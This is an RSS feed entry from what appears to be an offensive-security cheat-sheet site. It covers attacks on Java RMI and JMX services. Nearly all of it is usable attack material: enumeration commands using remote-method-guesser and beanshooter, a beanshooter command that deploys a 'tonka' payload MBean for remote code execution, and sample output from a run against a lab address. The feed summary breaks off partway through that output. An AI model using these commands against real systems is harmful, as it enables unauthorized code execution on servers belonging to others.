channel.title: Remote Method Invocation on TLDRBins
channel.description: Recent content in Remote Method Invocation on TLDRBins

item.title: Java RMI
item.description: RMI (Remote Method Invocation) rmg Enum java -jar rmg.jar enum <TARGET> <PORT> Ref: remote-method-guesser JMX (Java Management Extensions) beanshooter Enum java -jar beanshooter.jar enum <TARGET> <PORT> RCE # 1. Upload payload java -jar beanshooter.jar standard <TARGET> <PORT> tonka $ java -jar beanshooter.jar standard 10.10.69.227 2222 tonka [+] Creating a TemplateImpl payload object to abuse StandardMBean [+] [+] Deplyoing MBean: StandardMBean [+] MBean with object name de.qtc.beanshooter:standard=5515770682654 was successfully deployed. [+] [+] Caught NullPointerException while invoking the newTransformer action.
